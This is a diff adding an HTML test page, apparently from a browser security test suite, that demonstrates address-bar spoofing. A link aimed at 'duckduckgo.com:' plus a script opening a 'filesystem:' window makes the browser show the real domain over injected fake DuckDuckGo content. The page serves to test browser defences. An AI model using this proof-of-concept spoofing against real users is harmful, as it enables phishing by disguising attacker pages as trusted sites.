@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>URL Spoofing - Unsupported Application Scheme</title>
+    <script>
+        // eslint-disable-next-line no-unused-vars
+        function run() {
+            var t = window.open('filesystem:whatever', 'aa');
+            t.document.body.innerHTML = '<title>DuckDuckGo - Privacy Simplified</title><h1>Not DDG.</h1>';
+        }
+    </script>
+</head>
+
+<body>
+    <p><a href="../index.html">[Home]</a></p>
+    This test uses an unsupported application scheme and a href target to trick the browser into displaying the href
+    target as the current address bar value, while actually navigating to an attacker controlled page.
+    <a id="run" href="https://duckduckgo.com:" target="aa" onclick="setTimeout('run()',100)">
+        <h1>Start</h1>
+    </a>
+</body>
+
+</html>
